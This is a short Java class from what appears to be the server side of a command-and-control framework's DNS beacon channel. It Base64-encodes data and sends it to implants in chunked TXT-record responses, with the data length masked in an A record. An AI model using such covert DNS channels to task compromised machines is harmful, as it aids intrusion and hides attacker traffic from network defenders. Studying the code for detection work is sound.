package beacon.dns;

import common.CommonUtils;
import dns.DNSServer;
import encoders.Base64;

public class SendConversationTXT
        extends SendConversation {
    protected StringBuilder readme = null;
    protected int maxtxt;

    public SendConversationTXT(String id, String dtype, long mask, int maxtxt) {
        super(id, dtype, mask);
        this.maxtxt = maxtxt;
    }

    @Override
    public boolean started() {
        return this.readme != null;
    }

    @Override
    public DNSServer.Response start(byte[] data) {
        this.readme = new StringBuilder(Base64.encode(data));
        return DNSServer.A((long) data.length ^ this.idlemask);
    }

    @Override
    public DNSServer.Response next() {
        if (this.readme.length() >= this.maxtxt) {
            String next = this.readme.substring(0, this.maxtxt);
            this.readme.delete(0, this.maxtxt);
            return DNSServer.TXT(CommonUtils.toBytes(next));
        }
        String next = this.readme.toString();
        this.readme = null;
        return DNSServer.TXT(CommonUtils.toBytes(next));
    }

    @Override
    public boolean isComplete() {
        return this.readme == null;
    }
}

